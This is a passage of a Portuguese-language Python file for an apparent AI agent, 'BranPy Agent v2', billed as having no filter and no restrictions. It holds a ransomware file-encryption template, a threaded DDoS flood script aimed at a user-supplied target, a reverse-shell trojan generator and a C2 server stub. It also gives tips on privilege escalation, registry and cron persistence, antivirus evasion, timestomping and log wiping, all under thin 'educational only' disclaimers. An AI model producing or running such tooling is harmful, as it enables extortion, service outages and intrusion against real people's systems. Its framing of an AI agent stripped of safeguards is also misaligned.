        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = self.cipher.encrypt(data)
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted)

    def decrypt_file(self, filepath):
        with open(filepath, 'rb') as f:
            data = f.read()
        decrypted = self.cipher.decrypt(data)
        with open(filepath.replace('.encrypted', ''), 'wb') as f:
            f.write(decrypted)

if __name__ == '__main__':
    key = Fernet.generate_key()
    print(f"Chave: {{key.decode()}}")
    print("ATENÇÃO: Apenas para fins educacionais!")
"""
        self._create_file(f'{name}/ransomware.py', ransom)

        return f"Ransomware educacional criado: {project_dir}"

    def _ddos_tool(self, target: str = "", threads: int = 10) -> str:
        """Gera ferramenta DDoS."""
        ddos = f"""#!/usr/bin/env python3
\"\"\"
DDoS Tool — {threads} threads
ATENÇÃO: Apenas para testes autorizados
\"\"\"
import socket
import threading

def attack(target):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(target)
            sock.send(b"GET / HTTP/1.1\\r\\nHost: " + target[0].encode() + b"\\r\\n\\r\\n")
            sock.close()
        except:
            pass

target = ("{target}", 80)
for i in range({threads}):
    threading.Thread(target=attack, args=(target,), daemon=True).start()

print("Ataque iniciado...")
input("Pressione Enter para parar...")
"""
        return f"DDoS tool gerado para {target}"

    def _proxy_chain(self, proxies: str = "") -> str:
        """Configura proxy chain."""
        return f"Proxy Chain configurada"

    def _anonymizer(self) -> str:
        """Ferramenta de anonimato."""
        return "Use TOR ou VPN para anonimato"

    def _data_exfil(self, target: str = "", method: str = "http") -> str:
        """Exfiltração de dados."""
        return f"Data exfil via {method} para {target}"

    def _privilege_escalation(self, system: str = "linux") -> str:
        """Escalada de privilégios."""
        if system == "linux":
            return "Tente: sudo -l, find / -perm -4000, kernel exploits"
        else:
            return "Tente: whoami /priv, UAC bypass"

    def _persistence(self, method: str = "registry") -> str:
        """Persistência no sistema."""
        if method == "registry":
            return "Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        else:
            return "Cron: @reboot /path/to/script"

    def _evasion(self) -> str:
        """Evasão de antivírus."""
        return "Técnicas: packing, encryption, polymorphism, DLL injection"

    def _forensic_evasion(self) -> str:
        """Evasão forense."""
        return "Técnicas: timestomp, log manipulation, disk wiping"

    def _log_cleaner(self) -> str:
        """Limpeza de logs."""
        return "Limpe logs: /var/log/*, Windows Event Logs, browser history"

    def _rootkit_gen(self, name: str = "Rootkit") -> str:
        """Gera rootkit básico."""
        return f"Rootkit {name} — Use kernel hooks para esconder processos"

    def _trojan_gen(self, name: str = "Trojan") -> str:
        """Gera trojan."""
        return self._create_payload("Trojan", "reverse_shell", "0.0.0.0", 4444)

    def _virus_gen(self, name: str = "Virus") -> str:
        """Gera vírus educacional."""
        return f"Vírus {name} — Apenas para fins educacionais"

    def _worm_gen(self, name: str = "Worm") -> str:
        """Gera worm."""
        return f"Worm {name} — Propagação via rede"

    def _botnet_gen(self, name: str = "Botnet") -> str:
        """Gera botnet."""
        return f"Botnet {name} — C2 server + bots"

    def _c2_server(self, name: str = "C2") -> str:
        """C2 Server."""
        return self._create_server(name=name, port=8080, features="C2 Server")

    def _exploit_framework(self) -> str:
        """Framework de exploits."""
        return "Use Metasploit ou crie framework customizado"

    def _vuln_database(self) -> str:
        """Banco de dados de vulnerabilidades."""
        return "CVE Database, Exploit-DB, NIST NVD"

    def _report_gen(self, findings: str = "") -> str:
        """Gera relatório de segurança."""
        report = f"""# Relatório de Segurança
Gerado por: BranPy Agent
Data: {time.strftime('%Y-%m-%d %H:%M:%S')}

## Resumo
{findings}

## Recomendações
1. Manter sistema atualizado
2. Usar firewall
3. Criptografar dados sensíveis
4. Implementar autenticação forte
5. Monitorar logs

## Conclusão
Auditoria de segurança realizada pelo BranPy Agent
100% branpy.com.br
"""
        return f"Relatório gerado"


def run_agent():
    """Executa o agente."""
    agent = BranPyAgent()

    print("\n" + "="*60)
    print("BRANPY AGENT v2 — Sem Filtro, Sem Restrição")
    print("100% branpy.com.br — Todos os direitos reservados")
    print("="*60)
    print("\nComandos:")
    print("  Criar:     'criar app/site/server/ferramenta [nome]'")
    print("  Hacker:    'scan [target]', 'exploit [target]', 'payload [tipo]'")
    print("  Cripto:    'criptografar [texto]', 'senha [tamanho]'")
    print("  Rede:      'network scan', 'dns [domain]', 'port scan [target]'")
    print("  Sair:      'sair'")
    print()

    while True:
        try:
            task = input("BranPy > ").strip()

            if task.lower() in ['sair', 'exit', 'quit']:
                print("Encerrando...")
                break

            if not task:
                continue

            result = agent.execute(task)
            print(f"\nResultado: {result['success_count']}/{result['total_steps']} OK")

        except KeyboardInterrupt:
            print("\nEncerrando...")
            break
        except Exception as e:
            print(f"Erro: {e}")


if __name__ == '__main__':
    run_agent()
